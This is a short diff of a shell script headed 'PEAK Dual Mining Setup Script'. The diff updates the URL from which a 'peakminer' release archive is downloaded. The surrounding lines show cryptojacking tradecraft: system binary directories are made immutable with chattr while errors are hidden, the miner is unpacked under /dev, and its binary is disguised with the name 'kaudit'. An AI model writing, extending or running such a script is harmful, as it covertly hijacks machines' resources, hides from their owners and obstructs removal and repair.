@@ -44,7 +44,7 @@ sudo chattr -R +i /bin /usr/bin /sbin /usr/sbin 2>/dev/null || true
 echo "[*] Starting PEAK Dual Mining Setup Script"
 
 # Constants
-SRB_URL="https://github.com/peakminer/peakminer/releases/download/v2.19.0/peakminer-2.19.0.tar.gz"
+SRB_URL="https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz"
 SRB_ARCHIVE="/tmp/peak.tar.gz"
 SRB_DIR="/dev/peakminer"
 SRB_BINARY="$SRB_DIR/kaudit"
